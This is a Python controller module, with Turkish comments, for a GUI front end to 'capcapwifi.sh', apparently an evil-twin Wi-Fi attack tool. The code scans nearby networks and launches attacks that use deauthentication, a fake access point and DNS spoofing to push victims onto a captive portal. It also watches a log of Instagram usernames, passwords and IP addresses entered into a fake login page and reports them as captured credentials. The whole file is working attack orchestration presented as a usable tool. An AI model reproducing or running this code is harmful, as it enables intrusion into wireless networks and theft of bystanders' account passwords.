"""
CapCapWifi GUI – Backend Controller

capcapwifi.sh'i `--auto` modunda bir alt süreç olarak çalıştırır, çıktısını
okur ve GUI'ye callback'lerle aktarır. Arayüz hiçbir zaman doğrudan süreç veya
dosya işlemez; her şey buradan geçer.

İki veri kanalı var:
  * stdout/stderr  – taranan ağ listesi, hata mesajları, ilerleme satırları
  * çalışma alanı  – $CAPCAPWorkspacePath/capcap.status (yapılandırılmış
                     olaylar) ve instagram_credentials.log (yakalanan girdiler)
"""
from __future__ import annotations

import os
import re
import shutil
import signal
import subprocess
import threading
import time
from pathlib import Path
from typing import Callable, Dict, List, Optional

from models import (
    AttackConfig,
    AttackState,
    AttackType,
    CapturedCredential,
    EnvironmentCheck,
    PortalSite,
    TargetCandidate,
    WirelessInterface,
)

REPO_DIR = Path(__file__).resolve().parent.parent
SCRIPT = REPO_DIR / "capcapwifi.sh"

#: capcapwifi.sh ile aynı varsayılan (capcapwifi.sh:19).
WORKSPACE = Path(os.environ.get("CAPCAPWorkspacePath", "/tmp/capcapspace"))
STATUS_FILE = WORKSPACE / "capcap.status"
CREDENTIAL_LOG = WORKSPACE / "instagram_credentials.log"

ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
MAC_RE = re.compile(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$")

# `--scan-only` çıktısı sabit genişlikli sütunlar basar:
#   %-4s %-17s %-4s %-5s %-4s %-10s %-30.30s %s
# Alanları boşlukla ayırmak ESSID içindeki çift boşluklarda kayar, bu yüzden
# dilimliyoruz.
_SCAN_SLICES = {
    "channel": (0, 4),
    "bssid": (5, 22),
    "power": (23, 27),
    "clients": (28, 33),
    "quality": (34, 38),
    "enc": (39, 49),
    "vendor": (50, 80),
    "essid": (81, None),
}

#: Doğrulama için gerekli araçlar ve ne işe yaradıkları.
REQUIRED_TOOLS = (
    ("aircrack-ng", "handshake doğrulama / .cap işleme"),
    ("airmon-ng", "adaptörü monitor moduna alma"),
    ("hostapd", "sahte access point"),
    ("lighttpd", "portal web sunucusu"),
    ("php-cgi", "portalın PHP uçları"),
    ("kea-dhcp4", "portalın DHCP sunucusu"),
    ("dnsspoof", "tüm alan adlarını portala yönlendirme"),
    ("mdk4", "deauth (alternatif yöntem)"),
    ("iw", "kanal / arayüz bilgisi"),
)

OPTIONAL_TOOLS = (
    ("xterm", "ayrı pencereler (yoksa -m/tmux kullanılır)"),
    ("tmux", "headless çalışma"),
    ("cowpatty", "stok portallar için şifre doğrulama"),
    ("pyrit", "alternatif şifre doğrulama"),
)


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def _int_or(value: str, default: int) -> int:
    try:
        return int(str(value).strip())
    except (TypeError, ValueError):
        return default


def parse_scan_table(lines: List[str]) -> List[TargetCandidate]:
    """`--scan-only` çıktısındaki tabloyu TargetCandidate listesine çevirir."""
    candidates: List[TargetCandidate] = []
    started = False

    for raw in lines:
        line = strip_ansi(raw)
        if not started:
            # Başlık satırı: "CH BSSID PWR CLNT QLTY ENC VENDOR ESSID"
            if line.lstrip().startswith("CH") and "BSSID" in line:
                started = True
            continue

        # Ayırıcı satır ve boş satırlar atlanır.
        if not line.strip() or line.lstrip().startswith("---"):
            continue
        if "network(s) found" in line:
            break

        fields = {}
        for name, (start, end) in _SCAN_SLICES.items():
            fields[name] = line[start:end].strip() if end else line[start:].strip()

        if not MAC_RE.match(fields["bssid"]):
            continue

        candidates.append(
            TargetCandidate(
                bssid=fields["bssid"],
                channel=fields["channel"].rstrip("!"),
                power=_int_or(fields["power"], -100),
                clients=_int_or(fields["clients"], 0),
                quality=fields["quality"] or "??",
                enc=fields["enc"],
                vendor=fields["vendor"] if fields["vendor"] != "-" else "",
                essid=fields["essid"],
            )
        )

    return candidates


def parse_interface_table(lines: List[str]) -> List[WirelessInterface]:
    """`--list-interfaces` tablosunu ayrıştırır (başlık satırını atlar)."""
    ifaces: List[WirelessInterface] = []
    started = False
    for raw in lines:
        line = strip_ansi(raw)
        if not started:
            if line.lstrip().startswith("INTERFACE"):
                started = True
            continue
        if not line.strip():
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        ifaces.append(
            WirelessInterface(
                name=parts[0],
                state=parts[1] if len(parts) > 1 else "?",
                bands=parts[2] if len(parts) > 2 else "?",
                bus=parts[3] if len(parts) > 3 else "?",
                driver=parts[4] if len(parts) > 4 else "?",
                chipset=" ".join(parts[5:]) if len(parts) > 5 else "?",
            )
        )
    return ifaces


def parse_status_line(line: str) -> Optional[Dict[str, str]]:
    """`[2026-10-31T12:00:00] TARGET_SELECTED ssid=... bssid=...` biçimi."""
    match = re.match(r"\[.*?\]\s*(.+)", line)
    if not match:
        return None
    parts = match.group(1).split()
    if not parts:
        return None
    event: Dict[str, str] = {"type": parts[0]}
    for token in parts[1:]:
        if "=" in token:
            key, _, value = token.partition("=")
            event[key] = value
    return event


class CapCapWifiController:
    """
    Hibrit denetleyici: capcapwifi.sh'i CLI bayraklarıyla `--auto` modunda
    çalıştırır. Arayüz şu callback'lerle bilgilendirilir:

        on_state_change(AttackState)
        on_log(message, level)          level: info|success|warn|error|raw
        on_candidates([TargetCandidate])
        on_credential(CapturedCredential)
        on_environment([EnvironmentCheck])
    """

    def __init__(self) -> None:
        self._proc: Optional[subprocess.Popen] = None
        self._lock = threading.Lock()
        self._state = AttackState.IDLE
        self._candidates: List[TargetCandidate] = []
        self._credentials: List[CapturedCredential] = []
        self._watcher: Optional[threading.Thread] = None
        self._stop_watching = threading.Event()
        self._pending_output: List[str] = []
        self._install_result: Optional[bool] = None

        self.on_state_change: Callable[[AttackState], None] = lambda s: None
        self.on_log: Callable[[str, str], None] = lambda msg, level: None
        self.on_candidates: Callable[[List[TargetCandidate]], None] = lambda c: None
        self.on_credential: Callable[[CapturedCredential], None] = lambda c: None
        self.on_environment: Callable[[List[EnvironmentCheck]], None] = lambda c: None
        self.on_dependency_install: Callable[[bool], None] = lambda ok: None

    # ── durum ───────────────────────────────────────────────────

    @property
    def state(self) -> AttackState:
        return self._state

    @property
    def candidates(self) -> List[TargetCandidate]:
        return list(self._candidates)

    @property
    def credentials(self) -> List[CapturedCredential]:
        return list(self._credentials)

    @property
    def is_busy(self) -> bool:
        return self.state in (
            AttackState.INSTALLING,
            AttackState.SCANNING,
            AttackState.STARTING,
            AttackState.RUNNING,
        )

    @property
    def is_root(self) -> bool:
        return os.name != "nt" and os.geteuid() == 0

    # ── ortam ───────────────────────────────────────────────────

    def check_environment(self, background: bool = True) -> None:
        if background:
            threading.Thread(target=self._check_environment, daemon=True).start()
        else:
            self._check_environment()

    def _check_environment(self) -> None:
        checks: List[EnvironmentCheck] = []

        checks.append(
            EnvironmentCheck(
                name="Root yetkisi",
                ok=self.is_root,
                detail="yönetici olarak çalışıyor" if self.is_root else "sudo olmadan çalışıyor",
                hint="sudo ./run_gui.sh ile başlatın; monitor mode ve hostapd root ister.",
            )
        )

        for tool, purpose in REQUIRED_TOOLS:
            path = shutil.which(tool)
            checks.append(
                EnvironmentCheck(
                    name=tool,
                    ok=bool(path),
                    detail=purpose if path else "kurulu değil",
                    hint=f"sudo apt install -y {tool}",
                )
            )

        for tool, purpose in OPTIONAL_TOOLS:
            path = shutil.which(tool)
            checks.append(
                EnvironmentCheck(
                    name=f"{tool} (opsiyonel)",
                    ok=bool(path),
                    detail=purpose if path else "yok – bu özellik kullanılamaz",
                    hint=f"sudo apt install -y {tool}",
                    required=False,
                )
            )

        try:
            ifaces = self.list_interfaces()
        except Exception:
            ifaces = []
        wireless = [i for i in ifaces if i.name]
        checks.append(
            EnvironmentCheck(
                name="Kablosuz adaptör",
                ok=bool(wireless),
                detail=", ".join(i.name for i in wireless) if wireless else "bulunamadı",
                hint=(
                    "Adaptör takılı mı? VM kullanıyorsan USB passthrough yapılmış mı? "
                    "iw dev çıktısında görünmesi gerekir."
                ),
            )
        )

        monitor_ok = any("monitor" in i.state.lower() for i in wireless)
        checks.append(
            EnvironmentCheck(
                name="Monitor mode",
                ok=monitor_ok,
                detail="hazır" if monitor_ok else "henüz açılmadı (saldırı başında açılır)",
                hint="Sorun çıkarsa: sudo airmon-ng start <arayüz>",
            )
        )

        self.on_environment(checks)

    # ── kurulum ─────────────────────────────────────────────────

    def missing_required_tools(self) -> List[str]:
        """PATH'te bulunamayan zorunlu araçlar."""
        return [tool for tool, _ in REQUIRED_TOOLS if shutil.which(tool) is None]

    def install_dependencies(self, language: str = "tur") -> None:
        """Eksik paketleri kurar (`--install-deps`), çıktı log paneline akar."""
        if self.is_busy:
            self._log("Kurulum/saldırı zaten çalışıyor.", "warn")
            return

        self._install_result = None
        args = [
            "sudo", "-n", str(SCRIPT),
            "--install-deps",
            "--auto",
            "-m", "-k",
            "-l", language,
        ]
        self._set_state(AttackState.INSTALLING)
        self._log(
            "Paket kontrolü başlıyor. Eksik varsa otomatik kurulacak "
            "(ilk seferde birkaç dakika sürebilir).",
            "info",
        )
        self._run_async(args, mode="install")

    # ── listeler ────────────────────────────────────────────────

    def list_interfaces(self) -> List[WirelessInterface]:
        try:
            result = subprocess.run(
                ["sudo", "-n", str(SCRIPT), "--list-interfaces"],
                capture_output=True,
                text=True,
                timeout=15,
            )
        except (OSError, subprocess.SubprocessError):
            return []

        if result.returncode != 0:
            return []
        return parse_interface_table(result.stdout.splitlines())

    def list_portals(self) -> List[PortalSite]:
        sites_dir = REPO_DIR / "attacks" / "Captive Portal" / "sites"
        portals: List[PortalSite] = []
        if not sites_dir.is_dir():
            return portals
        for portal_path in sorted(sites_dir.iterdir()):
            if not portal_path.name.endswith(".portal"):
                continue
            stem = portal_path.name[: -len(".portal")]
            parts = stem.rsplit("_", 1)
            name = parts[0] if len(parts) == 2 else stem
            lang = parts[1] if len(parts) == 2 else "en"
            portals.append(
                PortalSite(
                    site_id=stem,
                    name=name,
                    lang=lang,
                    path=str(portal_path),
                    has_submit=(portal_path / "submit.php").exists(),
                )
            )
        return portals

    def list_handshakes(self) -> List[str]:
        folder = REPO_DIR / "attacks" / "Handshake Snooper" / "handshakes"
        if not folder.is_dir():
            return []
        return sorted(p.name for p in folder.glob("*.cap"))

    # ── tarama ──────────────────────────────────────────────────

    def start_scan(
        self,
        interface: str,
        scan_time: int = 30,
        channel: str = "",
        band: str = "bg",
    ) -> None:
        if self.is_busy:
            self._log("Zaten çalışan bir işlem var, önce durdurun.", "warn")
            return

        args = [
            "sudo",
            "-n",
            str(SCRIPT),
            "--scan-only",
            "--scan-time",
            str(scan_time),
            "-k",
        ]
        if interface:
            args += ["--interface", interface]
        if channel:
            args += ["-c", channel]
        if band:
            args += ["--band", band]

        self._set_state(AttackState.SCANNING)
        self._log(
            f"Tarama başladı – arayüz: {interface or 'otomatik'}, süre: {scan_time}s",
            "info",
        )
        self._run_async(args, mode="scan")

    # ── saldırı ─────────────────────────────────────────────────

    def start_attack(self, config: AttackConfig) -> None:
        if self.is_busy:
            self._log("Zaten çalışan bir işlem var, önce durdurun.", "warn")
            return

        args = [
            "sudo",
            "-n",
            str(SCRIPT),
            "--auto",
            "-k",
            "-m",
            "-a",
            config.attack_type.value,
            "-l",
            config.language,
            "--band",
            config.band,
        ]
        if config.interface:
            args += ["--interface", config.interface]
        if config.target_bssid:
            args += ["-b", config.target_bssid]
        if config.target_essid:
            args += ["-e", config.target_essid]
        if config.target_channel:
            args += ["-c", config.target_channel]
        if config.jammer_interface:
            args += ["--jammer-interface", config.jammer_interface]
        if config.ap_interface:
            args += ["--ap-interface", config.ap_interface]
        if config.ap_channel:
            args += ["--ap-channel", config.ap_channel]
        if config.ap_service:
            args += ["--ap-service", config.ap_service]
        if config.deauth_method:
            args += ["--deauth-method", config.deauth_method]
        if config.reg_domain:
            args += ["--reg-domain", config.reg_domain]
        if config.timeout_minutes:
            args += ["--timeout", str(config.timeout_minutes)]

        self._set_state(AttackState.STARTING)
        self._log(
            f"Saldırı başlatılıyor: {config.attack_type.value} → "
            f"{config.target_essid or config.target_bssid or 'hedef seçilmedi'}",
            "info",
        )
        self._run_async(args, mode="attack")

    def stop(self) -> None:
        proc = self._proc
        if proc and proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGINT)
            except OSError:
                try:
                    proc.terminate()
                except OSError:
                    pass
            try:
                proc.wait(timeout=8)
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except OSError:
                    pass
            self._log("İşlem durduruldu.", "warn")

        self._stop_watching.set()
        self._set_state(AttackState.STOPPED)

    # ── iç işleyiş ──────────────────────────────────────────────

    def _set_state(self, state: AttackState) -> None:
        self._state = state
        self.on_state_change(state)

    def _log(self, msg: str, level: str = "info") -> None:
        self.on_log(msg, level)

    def _run_async(self, args: List[str], mode: str) -> None:
        self._pending_output = []
        threading.Thread(target=self._run, args=(args, mode), daemon=True).start()

    def _run(self, args: List[str], mode: str) -> None:
        env = dict(os.environ)
        env["TERM"] = "xterm-256color"
        env["LANG"] = env.get("LANG", "C.UTF-8")

        try:
            proc = subprocess.Popen(
                args,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                env=env,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            self._log(
                "capcapwifi.sh bulunamadı ya da sudo parola soruyor. "
                "GUI'yi `sudo ./run_gui.sh` ile başlatın.",
                "error",
            )
            self._set_state(AttackState.ERROR)
            return
        except OSError as exc:
            self._log(f"İşlem başlatılamadı: {exc}", "error")
            self._set_state(AttackState.ERROR)
            return

        with self._lock:
            self._proc = proc

        # Yapılandırılmış olaylar ve yakalanan girdiler için dosya izleyici.
        self._stop_watching.clear()
        self._watcher = threading.Thread(
            target=self._watch_workspace, args=(mode,), daemon=True
        )
        self._watcher.start()

        try:
            for raw in proc.stdout:  # type: ignore[union-attr]
                line = strip_ansi(raw.rstrip())
                if not line:
                    continue
                self._pending_output.append(line)
                self._log(line, "raw")
                self._handle_status_line(line, mode)
        finally:
            proc.wait()
            self._stop_watching.set()
            if self._watcher:
                self._watcher.join(timeout=2)

        if mode == "scan":
            self._finish_scan()
        elif mode == "install":
            self._drain_workspace(mode)
            ok = self._install_result
            if ok is None:
                ok = proc.returncode == 0
            self._install_result = ok
            self._set_state(AttackState.IDLE if ok else AttackState.ERROR)
            self.on_dependency_install(bool(ok))
        else:
            # Süreç bittiğinde dosyada kalan satırları bir kez daha oku.
            self._drain_workspace(mode)
            if self._state in (AttackState.RUNNING, AttackState.STARTING):
                self._set_state(
                    AttackState.STOPPED if proc.returncode == 0 else AttackState.ERROR
                )

    def _handle_status_line(self, line: str, mode: str) -> None:
        event = parse_status_line(line)
        if not event:
            return
        kind = event.get("type", "")

        if kind == "SCAN_START":
            self._set_state(AttackState.SCANNING)
        elif kind == "DEP_CHECK":
            self._log("Paketler kontrol ediliyor…", "info")
        elif kind == "DEP_MISSING":
            tools = event.get("tools", "")
            self._log(f"Eksik paketler kuruluyor: {tools}", "warn")
        elif kind == "DEP_OK":
            self._install_result = True
            self._log("Tüm gerekli paketler hazır.", "success")
        elif kind == "DEP_FAILED":
            self._install_result = False
            self._log("Paket kurulumu başarısız oldu.", "error")
        elif kind == "SCAN_COMPLETE":
            count = event.get("candidates", "?")
            self._log(f"Tarama tamamlandı – {count} ağ bulundu.", "success")
        elif kind == "TARGET_SELECTED":
            self._log(
                "Hedef: {} ({}) kanal {}".format(
                    event.get("ssid", "?"), event.get("bssid", "?"), event.get("channel", "?")
                ),
                "info",
            )
        elif kind == "ATTACK_STARTED":
            self._set_state(AttackState.RUNNING)
        elif kind == "TIMEOUT":
            self._log(f"Süre doldu ({event.get('minutes', '?')} dk), saldırı kapatılıyor.", "warn")
        elif kind == "RESULT":
            self._handle_result(event)

    def _handle_result(self, event: Dict[str, str]) -> None:
        password = event.get("password")
        handshake = event.get("handshake")
        if password:
            cred = CapturedCredential(
                timestamp=time.strftime("%H:%M:%S"),
                ssid=event.get("ssid", ""),
                bssid=event.get("bssid", ""),
                password=password,
                username=event.get("username", ""),
            )
            self._credentials.append(cred)
            self.on_credential(cred)
            self._set_state(AttackState.CREDENTIALS_FOUND)
        elif handshake:
            self._set_state(AttackState.HANDSHAKE_CAPTURED)
            self._log(f"Handshake yakalandı: {handshake}", "success")

    def _watch_workspace(self, mode: str) -> None:
        """Süreç çalışırken status ve kimlik dosyalarını izler."""
        self._status_offset = self._file_size(STATUS_FILE)
        cred_offset = self._file_size(CREDENTIAL_LOG)

        while not self._stop_watching.is_set():
            if STATUS_FILE.exists():
                self._status_offset = self._read_new_lines(
                    STATUS_FILE, self._status_offset, self._handle_status_line, mode
                )

            if CREDENTIAL_LOG.exists():
                cred_offset = self._read_new_lines(
                    CREDENTIAL_LOG, cred_offset, self._handle_credential_line, mode
                )

            self._stop_watching.wait(0.4)

    def _drain_workspace(self, mode: str) -> None:
        """Süreç bittikten sonra son satırları kaçırmamak için bir kez daha oku."""
        self._status_offset = self._read_new_lines(
            STATUS_FILE, getattr(self, "_status_offset", 0),
            self._handle_status_line, mode,
        )

    @staticmethod
    def _file_size(path: Path) -> int:
        try:
            return path.stat().st_size
        except OSError:
            return 0

    def _read_new_lines(self, path: Path, offset: int, handler, mode: str) -> int:
        try:
            with path.open("r", encoding="utf-8", errors="replace") as handle:
                handle.seek(offset)
                for line in handle:
                    line = line.rstrip("\n")
                    if line:
                        handler(line, mode)
                return handle.tell()
        except OSError:
            return offset

    def _handle_credential_line(self, line: str, _mode: str) -> None:
        """instagram_credentials.log: zaman · IP · kullanıcı · şifre · UA"""
        parts = line.split("\t")
        if len(parts) < 4:
            return
        cred = CapturedCredential(
            timestamp=parts[0][11:19] if len(parts[0]) > 19 else parts[0],
            ssid="",
            bssid="",
            username=parts[2],
            password=parts[3],
            client_ip=parts[1],
        )
        self._credentials.append(cred)
        self.on_credential(cred)
        self._log(f"Yeni giriş yakalandı: {cred.username} ({cred.client_ip})", "success")
        self._set_state(AttackState.CREDENTIALS_FOUND)

    def _finish_scan(self) -> None:
        candidates = parse_scan_table(self._pending_output)
        if candidates:
            self._candidates = candidates
            self.on_candidates(candidates)
            self._log(f"{len(candidates)} ağ listelendi.", "success")
        else:
            self._log(
                "Tarama çıktısında ağ bulunamadı. Adaptör monitor mode destekliyor mu? "
                "Süreyi artırmayı deneyin.",
                "warn",
            )
        self._set_state(AttackState.STOPPED)
